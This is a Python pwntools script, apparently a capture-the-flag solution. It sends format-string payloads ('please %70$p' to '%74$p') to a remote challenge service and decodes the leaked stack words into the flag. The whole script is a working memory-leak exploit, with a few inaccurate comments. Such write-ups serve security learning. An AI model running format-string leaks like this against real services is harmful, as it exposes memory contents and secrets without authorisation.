
from pwn import * #Pwn Tools
import time # Sometimes the connection would time out a lot, using time.sleep reduced the timeouts. 

context.log_level = 'critical' # Pwn tools config to tell us everything

lines = [] # Empty array which will contain all raw outputs
flag_chars = "" # Empty string where the entire output will be stitched into
flag_bytes = [] # Empty array where we will take 2 bits of string from flag_chars to create a byte and store them
flag_words = [] # Empty array where we will store 8 bytes at a time from flag_bytes
flag = [] # Empty array where the final flag will go

for i in range(70, 75): # A loop iterating where i is between 70 and 74


    s = remote('mc.ax', 31569) # Connect to remote host
    #s = process('./please') # Use this to locally test

    s.recvline() # Recieve the first line the program tells us
    s.sendline('please %' + str(i) + '$p') # Send in our payload, the please string, and ith %p

    output = str(s.recv())[9:-15][2:] # We get the raw output and strip it saw that only the hex value remains
    print(output) # Print the stripped output, just in case
    lines.append(output) # Append the output in lines
    

    s.close() # Close the connection
    time.sleep(5) # Wait 5 seconds and loop or continue


lines[-1] = '000' + lines[-1] # We add 000 before the last element of outputs. 

for byte in lines:
    flag_chars += byte # Stitch all outputs into one big string




for x, y in zip(*[iter(flag_chars)]*2): # We iterate 2 characters at a time, x is first character and y is second, character represents bits of a byte that is
        byte = str(x) + str(y) # Our byte is then x + y. So "44434241" will become "['44'], ['43'], ['42']..."
        flag_bytes.append(byte) # We append the bytes to our array
        if(len(flag_bytes) % 8 == 0): # After 8 bytes have been written on the flag_bytes array,
            flag_words.append(flag_bytes) # We append these 8 bytes as one word in flag_words
            flag_bytes = [] # And reset flag_bytes
        
            

for word in flag_words: # We take each word (8 bytes)
    for byte in word[::-1]: # We reverse them
        try:
            flag.append(bytes.fromhex(byte).decode('ASCII')) # Convert them from hex to binary and decode in ascii and store each ASCII character in flag
        except:
            pass # Not all bytes are printable (such as the last ones where we added 0s, so we catch the erros and ignore them)
print("".join(flag)) # We join the characters into a flag and print it
